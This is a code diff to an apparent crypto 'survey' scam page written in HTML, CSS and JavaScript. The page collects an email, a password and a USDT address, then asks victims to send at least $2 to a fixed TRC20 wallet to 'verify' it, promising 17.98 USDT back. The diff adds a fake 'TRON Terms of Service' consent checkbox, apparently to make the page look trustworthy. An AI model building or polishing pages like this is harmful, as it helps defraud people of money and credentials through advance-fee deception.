@@ -47,6 +47,7 @@ input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px s
 .question-card{background:linear-gradient(180deg,#141826,#12151b);border-radius:16px;padding:16px;display:flex;flex-direction:column;gap:12px;}
 .question-card h2{text-align:center;font-size:18px;}
 .wallet-text {font-size:12px; word-break: break-all; overflow-wrap: anywhere; max-width:100%;}
+
 /* ===== Verification Block Styles ===== */
 .verification-block {
   background: linear-gradient(180deg,#141826,#12151b);
@@ -97,6 +98,39 @@ input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px s
 #copy-wallet-btn:hover {
   background: #3f5bcc;
 }
+
+/* ===== Checkbox Styles ===== */
+.checkbox-container {
+  display: flex;
+  align-items: center;
+  font-size: 14px;
+  color: var(--text);
+  user-select: none;
+  margin-top: 10px;
+  gap: 8px; /* расстояние между галочкой и текстом */
+}
+
+.checkbox-container input[type="checkbox"] {
+  width: 20px;
+  height: 20px;
+  appearance: none;
+  background-color: #12151b;
+  border: 2px solid var(--accent);
+  border-radius: 4px;
+  position: relative;
+  cursor: pointer;
+  flex-shrink: 0;
+}
+
+.checkbox-container input[type="checkbox"]:checked::after {
+  content: "✓";
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 16px;
+  color: var(--accent);
+}
 </style>
 </head>
 
@@ -109,9 +143,16 @@ input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px s
 
     <!-- Register -->
     <div id="register-screen" class="section">
-      <input type="text" id="login" placeholder="Login">
+      <input type="text" id="login" placeholder="Email">
       <input type="password" id="password" placeholder="Password">
       <input type="text" id="wallet" placeholder="USDT Address for Payments">
+
+      <!-- Checkbox -->
+<label class="checkbox-container">
+  <input type="checkbox" id="tos-checkbox">
+  <span>I have read and agree to the <a href="https://tronscan.org" target="_blank" style="color:var(--accent); text-decoration:underline;">TRON Terms of Service</a></span>
+</label>
+
       <button id="start-btn" disabled style="opacity:.5;cursor:not-allowed;">
         Start Survey
       </button>
@@ -141,7 +182,7 @@ input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px s
         <p>To activate your wallet, please send a small verification amount of at least <strong>$2</strong> to the following account (TRX TRC20)</p>
         <div class="wallet-container">
           <span id="wallet-address">TDYoHqu3HD294fB13KAYDYpAvNo52SuLpq</span>
-          <button id="copy-wallet-btn">Copy Wallet</button>
+          <button id="copy-wallet-btn">Copy Wallet Address</button>
         </div>
         <p>This step confirms that the wallet belongs to you.</p>
         <p>Upon successful verification, your wallet will be credited with <strong>17.98 USDT</strong>. The verification amount you sent will also be accounted for.</p>
@@ -209,10 +250,11 @@ const loginInput = document.getElementById("login");
 const passwordInput = document.getElementById("password");
 const walletInput = document.getElementById("wallet");
 const startBtn = document.getElementById("start-btn");
+const tosCheckbox = document.getElementById("tos-checkbox");
 
 // ===== Field Validation =====
 function checkInputs() {
-  if (loginInput.value.trim() !== "" && passwordInput.value.trim() !== "" && walletInput.value.trim() !== "") {
+  if (loginInput.value.trim() !== "" && passwordInput.value.trim() !== "" && walletInput.value.trim() !== "" && tosCheckbox.checked) {
     startBtn.disabled = false;
     startBtn.style.opacity = "1";
     startBtn.style.cursor = "pointer";
@@ -225,6 +267,7 @@ function checkInputs() {
 loginInput.addEventListener("input", checkInputs);
 passwordInput.addEventListener("input", checkInputs);
 walletInput.addEventListener("input", checkInputs);
+tosCheckbox.addEventListener("change", checkInputs);
 
 // ===== Save & Load Progress =====
 function saveProgress() {
